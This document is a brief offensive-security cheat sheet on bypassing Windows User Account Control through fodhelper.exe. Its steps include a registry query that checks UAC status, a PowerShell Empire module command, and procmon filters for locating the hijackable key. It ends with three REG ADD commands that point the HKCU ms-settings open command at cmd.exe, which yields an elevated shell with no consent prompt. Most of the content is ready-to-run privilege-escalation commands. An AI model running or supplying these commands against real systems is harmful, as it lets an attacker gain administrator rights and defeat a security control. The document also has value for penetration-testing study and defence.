# UAC

https://book.hacktricks.xyz/windows/authentication-credentials-uac-and-efs#uac

- [Enumeration](#enumeration)
- [fodhelper.exe](#fodhelper)

<a name="enumeration"></a>
## Enumeration
Check if UAC is enabled, (EnableLUA = 0x01)
```sh
reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\
```

<a name="fodhelper"></a>
## fodhelper.exe
Bypass uac when access to local administrator. fodhelper.exe runs as a high integrity process, and interacts with registry keys that can be modified without administrative priviledges. Application manifest lets OS know how to handle application when it's started.

PowerShell Empire Module
```sh
usemodule powershell/privesc/bypassuac_fodhelper
```

View the application manifest. (In SysinternalsSuite). This shows this application requires administrator (High Integrity) and auto elevate (doesn't show UAC consent popup).
```sh
sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
```

procmon.exe - Process monitor  
Filters:
- Process Name is fodhelper.exe Include
- Operation contains Reg Include
- Result is NAME NOT FOUND Include
- Path contains HKCU Include (Can only modify HKEY_CURRENT_USER (HKCU) registries)
- Path contains ms-settings\shell\open\command Include (Narrow down interesting results, remove other Path filter, Remove result filter)

Add the register key, Add empty delegate value, Replace the default register command key to cmd.exe
```sh
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
```
